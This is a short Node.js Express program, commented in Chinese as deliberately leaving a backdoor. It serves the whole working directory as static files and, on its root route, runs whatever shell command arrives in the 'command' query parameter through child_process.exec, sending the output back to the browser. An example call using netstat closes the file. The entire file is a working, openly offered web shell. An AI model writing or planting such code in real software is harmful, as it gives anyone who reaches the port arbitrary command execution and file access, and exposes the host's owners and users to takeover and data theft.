// 给程序留一个后门

var express = require('express')
var app = express()

// 内置中间件  静态文件访问

app.use(express.static('./'))

// 监听
var server = app.listen(8181, function () {
  var host = server.address().address
  var port = server.address().port
  console.info(host, port)
})

// 当访问根目录时触发
app.get('/', function (req, res) {
  // command
  var command = req.query.command

  // 执行
  var exec = require('child_process').exec

  exec(command, function (err, stdout) {
    // 输出到网页
    res.end(stdout)
  })
})

//! 通过程序访问 http://127.0.0.1:8181/?command=netstat -an
